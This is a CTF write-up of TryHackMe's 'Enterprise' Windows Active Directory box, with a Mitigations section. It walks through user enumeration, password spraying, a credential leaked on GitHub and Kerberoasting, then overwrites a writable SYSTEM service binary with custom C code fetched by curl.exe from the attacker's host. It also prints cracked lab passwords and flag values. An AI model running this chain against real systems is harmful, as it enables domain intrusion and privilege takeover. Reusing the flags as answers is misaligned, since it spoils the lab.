# THM — Enterprise

```
███████╗███╗   ██╗████████╗███████╗██████╗ ██████╗ ██████╗ ██╗███████╗███████╗
██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔════╝██╔════╝
█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝██████╔╝██████╔╝██║███████╗█████╗  
██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██║╚════██║██╔══╝  
███████╗██║ ╚████║   ██║   ███████╗██║  ██║██║     ██║  ██║██║███████║███████╗
╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
                       TryHackMe — Hard
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — a full Windows DC (`LAB.ENTERPRISE.THM`) with IIS, an Atlassian Bitbucket on 7990, SMB, LDAP, Kerberos, WinRM and RDP
- [x] Enumerated valid domain users with `kerbrute`
- [x] Password-sprayed and got `enterprise:Password123!` (Guest-level), which opened the `Docs` SMB share
- [x] OSINT on the company GitHub (`Enterprise-THM`) leaked a PowerShell script with the password `ToastyBoi!` → `nik`
- [x] `evil-winrm` as `nik`; Kerberoasted the `bitbucket` service account and cracked its ticket to `littleredbucket`
- [x] `bitbucket` can't WinRM, so RDP'd in instead and read the **user flag** on its Desktop
- [x] Found `zerotieroneservice` (running as LocalSystem) whose program folder is world-writable
- [x] Overwrote the service binary with a payload, restarted the service as SYSTEM, and read the **root flag**

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| kerbrute | Enumerating valid domain usernames |
| NetExec (nxc) | SMB auth checks and password spraying |
| smbclient | Reading the `Docs` share |
| hashcat | Cracking the `.xlsx` (`-m 9600`) and the Kerberos ticket (`-m 13100`) |
| impacket (GetNPUsers, GetUserSPNs) | AS-REP roast attempt and Kerberoasting |
| evil-winrm | Shell as `nik` |
| xfreerdp | Interactive session as `bitbucket` (WinRM was refused) |
| sc.exe / icacls | Finding and abusing the insecure service |
| mingw-w64 (`x86_64-w64-mingw32-gcc`) | Compiling the malicious service binary |

---

## TL;DR

Guest-level SMB access (via a sprayed `Password123!`) exposes a `Docs` share, and OSINT on the company's public GitHub leaks a PowerShell script containing the password `ToastyBoi!`, which belongs to `nik`. As `nik` over WinRM, Kerberoasting the `bitbucket` service account yields a ticket that cracks to `littleredbucket`. `bitbucket` is not allowed to WinRM, so RDP gives an interactive shell and the user flag. For root, the `zerotieroneservice` runs as LocalSystem from a folder where `BUILTIN\Users` has write access, so overwriting the service executable and restarting it runs code as SYSTEM.

## Introduction

Enterprise is a hard Windows AD box, and it earns the rating by making you chain five different weaknesses rather than land one big exploit: a weak sprayed password, credentials leaked in public source control, a Kerberoastable service account, a login-rights quirk (WinRM denied but RDP allowed), and finally an insecure-service-permissions privesc. The lesson running through all of it is that AD compromise is usually an accumulation of small trust mistakes, not a single CVE.

## Recon

```bash
rustscan -a 10.49.167.106 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
```

The port list is unmistakably a Domain Controller, with two things that stand out: IIS on 80 and **Atlassian Bitbucket on 7990**.

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http
88/tcp    open  kerberos-sec
389/tcp   open  ldap          Domain: ENTERPRISE.THM, Site: Default-First-Site-Name
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http          (WinRM)
7990/tcp  open  http          Atlassian Bitbucket ("Log in with Atlassian account")
...
DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
```

Add the hosts and enumerate. SMB allows a null session, so start with user enumeration over Kerberos:

```bash
echo "10.49.167.106 enterprise.thm lab.enterprise.thm lab-dc.lab.enterprise.thm" | sudo tee -a /etc/hosts
kerbrute userenum --dc 10.49.167.106 -d LAB.ENTERPRISE.THM /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME: banana@LAB.ENTERPRISE.THM
[+] VALID USERNAME: cake@LAB.ENTERPRISE.THM
[+] VALID USERNAME: enterprise@LAB.ENTERPRISE.THM
[+] VALID USERNAME: nik@LAB.ENTERPRISE.THM
[+] VALID USERNAME: spooks@LAB.ENTERPRISE.THM
[+] VALID USERNAME: joiner@LAB.ENTERPRISE.THM
```

## Foothold

AS-REP roasting is a dead end (`nik` and the others have pre-auth enabled), so move to a spray of the enumerated users, trying `username:username` and one common password:

```bash
netexec smb 10.49.167.106 -u users.txt -p 'Password123!' --continue-on-success
```

```
SMB  10.49.167.106  445  LAB-DC  [+] LAB.ENTERPRISE.THM\enterprise:Password123! (Guest)
```

That Guest-level account opens the `Docs` share:

```bash
smbclient //10.49.167.106/Docs -U "guest"
```

It holds `RSA-Secured-Credentials.xlsx`, a password-protected workbook. Its open-password cracks with hashcat, but the contents are another locked layer (see Rabbit Holes). The path that actually pays off is OSINT: the company name points at a public GitHub org.

```
site:github.com "Enterprise-THM"
```

That leads to `github.com/Enterprise-THM/About-Us`, and the commit author `Sq00ky` has a repo containing a PowerShell script with a hardcoded credential:

```powershell
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
```

It belongs to `nik`:

```bash
netexec smb 10.49.167.106 -u 'nik' -p 'ToastyBoi!' -d 'LAB.ENTERPRISE.THM'
# [+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
```

## Shell / Initial Access

NetExec reports WinRM as failing for `nik`, but that is a false negative — `evil-winrm` connects fine:

```bash
evil-winrm -i 10.49.167.106 -u 'nik' -p 'ToastyBoi!'
# *Evil-WinRM* PS C:\>
```

## Escalation Path

`nik` is a low-privilege user, so look for Kerberoastable service accounts. With `nik`'s credentials:

```bash
impacket-GetUserSPNs LAB.ENTERPRISE.THM/nik:'ToastyBoi!' -dc-ip 10.49.167.106 -request
```

```
ServicePrincipalName  Name       MemberOf
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$...  (ticket)
```

Crack the ticket:

```bash
hashcat -m 13100 bitbucket.hash /usr/share/wordlists/rockyou.txt
# ...:littleredbucket
```

`bitbucket:littleredbucket` is valid over SMB, but WinRM refuses it (`WinRMAuthorizationError` — the account is not in Remote Management Users). RDP is open, though:

```bash
xfreerdp /v:10.49.167.106 /u:'bitbucket@LAB.ENTERPRISE.THM' /p:'littleredbucket' /cert:ignore
```

```
C:\Users\bitbucket\Desktop>type user.txt
THM{ed882d02b34246536ef7da79062bef36}
```

## Exploitation

From the `bitbucket` RDP session, look at non-default services. `zerotieroneservice` runs as LocalSystem:

```cmd
sc.exe qc zerotieroneservice
```

```
BINARY_PATH_NAME   : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
SERVICE_START_NAME : LocalSystem
```

Check the permissions on its program folder:

```cmd
icacls "C:\Program Files (x86)\Zero Tier\Zero Tier One"
```

```
BUILTIN\Users:(I)(OI)(CI)(W)
```

`BUILTIN\Users` has write on the folder that holds a SYSTEM service's executable — so overwrite the executable and restart the service. Build a small replacement that copies the Administrator's flag somewhere `bitbucket` can read it:

```c
#include <windows.h>
int main(void) {
    system("cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\bitbucket\\Desktop\\root.txt");
    return 0;
}
```

Compile it **statically** (the dynamically-linked build wouldn't run on the target), host it, and overwrite the real service binary:

```bash
x86_64-w64-mingw32-gcc -static -s /tmp/zero.c -o /tmp/Zero.exe
python3 -m http.server 8000
```

```cmd
curl.exe http://192.168.155.76:8000/Zero.exe -o "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"
sc.exe stop zerotieroneservice & sc.exe start zerotieroneservice
```

The service starts as SYSTEM, runs the payload, and drops the flag where `bitbucket` can read it:

```cmd
C:\Users\bitbucket\Desktop>type C:\Users\bitbucket\Desktop\root.txt
THM{1a1fa94875421296331f145971ca4881}
```

## Rabbit Holes

- **AS-REP roasting:** none of the enumerated users had pre-auth disabled, so `GetNPUsers` returned nothing.
- **The `.xlsx`:** its open-password cracks with `hashcat -m 9600`, but the workbook just leads to another password prompt. The real credential came from GitHub, not the share.
- **WinRM for `bitbucket`:** the cracked account connects over SMB but gets `WinRMAuthorizationError` on WinRM. It took switching to RDP to realise the account simply isn't in Remote Management Users — different logon rights, same password.
- **The service binary:** the first (dynamically-linked) `Zero.exe` didn't execute on the target for lack of its runtime DLLs, and it was first uploaded into the wrong folder (`...\Zero Tier\` instead of overwriting `...\Zero Tier One\ZeroTier One.exe`). Static-compiling and overwriting the actual binary fixed both.

## Flag

| Flag | Value |
|---|---|
| User | `THM{ed882d02b34246536ef7da79062bef36}` |
| Root | `THM{1a1fa94875421296331f145971ca4881}` |

## Mitigations

- **Password spraying / weak passwords:** `Password123!` should never survive a policy. Enforce length and complexity, and lock or alert on spray patterns.
- **Credentials in source control:** the whole foothold is a password committed to a public GitHub repo. Secrets never belong in code; rotate anything that lands there and scan repos with tooling like gitleaks.
- **Kerberoasting:** service accounts with SPNs and crackable passwords are the classic AD weakness. Use long random passwords or Group Managed Service Accounts (gMSA), and monitor for bulk TGS requests.
- **Insecure service permissions:** `BUILTIN\Users` must never have write on a folder that holds a SYSTEM service's executable. Lock the ACL down to Administrators/SYSTEM and audit service paths with a tool like PowerUp.

## Key Takeaway

This box is a textbook AD chain: every single step is a small, realistic misconfiguration, and the compromise is the sum of them. The two that transfer most directly to real engagements are checking public source control for the target organisation (secrets leak there constantly) and always enumerating service-binary and service-config permissions on Windows — insecure service permissions are one of the most common and most reliable local privesc vectors.

## If I Did It Again

I'd check the company's GitHub org during the very first recon pass instead of burning time cracking the `.xlsx`, and I'd test logon rights (`net user`, group membership) the moment a cracked account fails WinRM, rather than assuming the password was wrong and reaching for RDP by trial and error.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--enterprise)
